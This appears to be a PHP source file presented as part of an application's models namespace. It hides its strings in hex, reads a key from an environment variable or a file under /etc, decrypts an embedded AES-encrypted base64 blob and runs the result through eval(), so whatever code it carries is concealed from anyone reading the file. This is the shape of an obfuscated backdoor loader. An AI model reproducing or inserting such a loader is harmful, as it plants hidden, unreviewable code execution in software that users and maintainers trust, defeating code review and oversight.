<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('OnegyYzfrqtY7QZDGF9mVw==');

$c=base64_decode(

'Aw75VvhwvZjmh1Tiq+iDT5BK6RZ2lNYcEM2A+0FNDqDr1eLqQl4PmIYwBcj0pNkyvcgfYwkCOa0p' .
'i7HxJFKflAtfpRnOI3xefCybml2Lq24XZDrk2M0TjeRFZoq0fViq95hj7wzwN9I41Hw92+RIXtiZ' .
'94GNWzFBBfYq2o/7Fo0DrtMiAduBH8SsrWT0gqUAR+OhiUCubdXcuwwHGg6YGKpH/fgG0stEYsLM' .
'hKfTLHTNzZiozow9lz5PJkaylVj6ZRnwqm/Sgg+5x2InsE/MyrOyEA/zQ5fR6HkywJARo0W+JPox' .
'EbLdcnYdhlreBZU/BZ4vDJPczMBPhxV6UCpcKd57aesTsTW2u37XN4xbvpA9Wj5qZXPutomRSTw8' .
'NVjLUS9wDBDyqHzeDzieTfJmCKyoyN2/Gclz4bXR+0alNoniTaXmiWE0etTnxt81bHJFS2X+bUQg' .
'aad0EIq2jiuU9IUhPkhjQDiY5V6/hFCtNsINdzBv52q3ZT9GpYzk065YnYkkXoxJiqtyg/WnqU9u' .
'ShjTiAQHwQUjW7yVZQ1MnBhyyMqO6iQYbqjYbVer3gmdFo2JJj7Qm7BiTj5iCLr6vg7I0tnkazAh' .
'JtPPmhQEAlaI6gVSCteYIqAIMz8fvp62NFA4V9Zk2mDBLuKQrFtaNzwq/CwiTs5A1A0Qe3sifCh/' .
'6PBkQ4cJowJUtAYwy/2lzV8PM1+9ZkSj6WjveTvCRsS5ropTLJHBf66tDR3FlXieyTiAtshMnNZ+' .
'PJkyjYRXO5+x4SlEsAp9H7ZJ+2GT7OJYphM3S8GkeAs48jiCRDXj/MdbTji+rqOcw51OcFVv7BbG' .
'IkePfSIDcbhkDoRd9o4LPfrLlGab2lls2oEyKSMr0Rowkjart6SD70vGSGXw4WpdOIUr0L8d+V4p' .
'KvT0Nh7nQyn9J4VLz0w1B3W3y2VkmTT97vaKv4vIr46U7waNu2o3AknjL5xoZGspYdqSgyAgq3O6' .
'sR8VfbDGS1zgUvuhrIuoFO7hWgJ3GmK28FdIcG+i3yOYR3GO0nlh0AZrG90maXAgjzBH3cXYydky' .
'6QZVkt8/kQEGrVii/fIuIEKn8+kT3b6M0S7Y6qYyrOhZrTksyE5bhzd+22tYWtFGb5BZuQR9S0Nm' .
'2acIufU/cRr3qiwO6ZWBzVu/Huh5Y9g+bSBiMQNpV6IHGSGxMM8+aVPm/SC1Zj1pu7N0+OBUyX9T'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

